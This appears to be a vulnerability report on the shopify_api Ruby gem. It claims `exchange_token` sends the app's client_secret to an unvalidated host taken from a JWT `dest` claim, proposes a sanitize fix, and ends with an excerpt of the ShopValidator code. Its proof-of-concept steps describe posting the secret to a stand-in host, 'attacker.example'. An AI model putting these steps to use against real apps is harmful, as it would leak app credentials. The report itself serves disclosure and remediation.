Found it: `TokenExchange.exchange_token` sends the app's `client_secret` to a host derived from the JWT's `dest` claim without running it through `ShopValidator.sanitize!`, while the sibling method `migrate_to_expiring_token` in the same file does validate the shop with `Utils::ShopValidator.sanitize!` before use.

### Title
`client_secret` sent to unvalidated host derived from JWT `dest` claim in `exchange_token` - (File: lib/shopify_api/auth/token_exchange.rb)

### Summary
`ShopifyAPI::Auth::TokenExchange.exchange_token` takes the `dest` claim from an incoming session-token JWT and uses it, unsanitized, as the hostname that receives the app's confidential `client_secret` in the token-exchange POST body.

### Finding Description
`exchange_token` decodes the caller-supplied `session_token` via `JwtPayload.new`, reads `jwt_payload.shop` (i.e. the `dest` claim stripped of `https://`), and directly builds a session/HTTP client from it: [1](#0-0) [2](#0-1) . That value is fed straight into `Clients::HttpClient.new(session: shop_session, ...)`, which builds the outbound request host as `https://#{session.shop}` and posts a body containing `client_secret: ShopifyAPI::Context.api_secret_key` to that host: [3](#0-2) [4](#0-3) .

`JwtPayload` only verifies the HMAC signature and that `aud == Context.api_key`; it performs no format/allow-list check on `dest` (no `.myshopify.com`/`.myshopify.io` suffix check, no `ShopValidator` call): [5](#0-4) . Compare this to `migrate_to_expiring_token` in the very same module, which correctly calls `Utils::ShopValidator.sanitize!(shop)` before constructing the session that will receive the `client_secret`: [6](#0-5) . The `ShopValidator` module exists precisely to reject non-Shopify hosts (attacker-controlled domains, domains merely containing "myshopify.com" as a substring, userinfo tricks, etc.): [7](#0-6) [8](#0-7) , but `exchange_token` never invokes it.

The identity binding that is broken: the host that is asserted to be legitimate (the `dest` claim, only verified by signature+`aud`) is not the same as the host that is validated as a genuine `*.myshopify.com`/trusted Shopify domain before the app's `client_secret` is transmitted to it. `dest` is attacker-influenced whenever `session_token` originates from any source other than Shopify's own admin iframe postMessage (e.g., a value an attacker can get the embedded app's frontend to submit, or any code path that forwards a token acquired elsewhere) — the token's cryptographic validity only proves it was minted with `Context.api_secret_key`/`old_api_secret_key` and intended for this `aud`; it says nothing about `dest` being restricted to a `myshopify.com`-family domain.

### Impact Explanation
If an attacker can get the host application to call `exchange_token` with a JWT whose `dest` claim is an arbitrary hostname (while still being validly signed — e.g. any JWT the app itself has previously issued or that a malicious embedded surface can obtain/replay with a manipulated `dest`), the library will POST the app's `client_secret` to that attacker-chosen host. This is credential leakage of the app's `client_secret` — classified High under the report's rubric ("SSRF with the app's credentials ... or credential leakage into logs or error output" — here it's leakage to a network endpoint, which is the SSRF-with-credentials case, since the request carries `client_id`/`client_secret` to a host that was not confirmed to be Shopify infrastructure).

### Likelihood Explanation
Exploitability strictly depends on how the host application sources `session_token` for `exchange_token`. In the canonical flow (token retrieved via `App Bridge`'s `getSessionToken` from Shopify's own frame), `dest` is set by Shopify and this is not exploitable. But the gem itself provides no defense-in-depth if the host app passes through any other JWT (misconfiguration, replay from a different trust boundary, multi-tenant proxy, etc.) — and the gem's own code inconsistently guards this exact risk (validating in `migrate_to_expiring_token` but not in `exchange_token`), indicating this is a real gap rather than an intentional design decision.

### Recommendation
In `exchange_token`, sanitize `dest_shop` the same way `migrate_to_expiring_token` does before using it to build the outbound session/client:
```ruby
dest_shop = ShopifyAPI::Utils::ShopValidator.sanitize!(jwt_payload.shop)
```
This ensures the host that receives `client_secret` is provably a trusted Shopify domain, consistent with the rest of the module.

### Proof of Concept
1. Construct/obtain any session token JWT that is validly signed with the app's `api_secret_key` (or `old_api_secret_key`) but whose `dest` claim is set to an attacker-controlled hostname, e.g. `dest: "https://attacker.example"`, and `aud` equal to the app's `api_key`.
2. Call `ShopifyAPI::Auth::TokenExchange.exchange_token(session_token: forged_token, requested_token_type: ...)`.
3. `JwtPayload.new` accepts the token (signature and `aud` match); `jwt_payload.shop` returns `"attacker.example"` unmodified: [9](#0-8) .
4. `Clients::HttpClient.new(session: Session.new(shop: "attacker.example"), base_path: "/admin/oauth")` builds `@base_uri = "https://attacker.example"` and the subsequent `client.request(...)` POSTs `{client_id, client_secret, subject_token, ...}` to `https://attacker.example/admin/oauth/access_token`, exfiltrating the app's `client_secret` to the attacker-controlled host.

# typed: strict
# frozen_string_literal: true

require "addressable/uri"

module ShopifyAPI
  module Utils
    module ShopValidator
      TRUSTED_SHOPIFY_DOMAINS = T.let(
        [
          "shopify.com",
          "myshopify.io",
          "myshopify.com",
          "spin.dev",
          "shop.dev",
        ].freeze,
        T::Array[String],
      )

      class << self
        extend T::Sig

        sig do
          params(
            shop_domain: String,
            myshopify_domain: T.nilable(String),
          ).returns(T.nilable(String))
        end
        def sanitize_shop_domain(shop_domain, myshopify_domain: nil)
          uri = uri_from_shop_domain(shop_domain, myshopify_domain)
          return nil if uri.nil? || uri.host.nil? || uri.host.empty?

          trusted_domains(myshopify_domain).each do |trusted_domain|
            host = T.cast(uri.host, String)
            uri_domain = uri.domain
            next if uri_domain.nil?

            no_shop_name_in_subdomain = host == trusted_domain
            from_trusted_domain = trusted_domain == uri_domain

            if unified_admin?(uri) && from_trusted_domain
              return myshopify_domain_from_unified_admin(uri)
            end
            return nil if no_shop_name_in_subdomain || host.empty?
            return host if from_trusted_domain
          end
          nil
        end
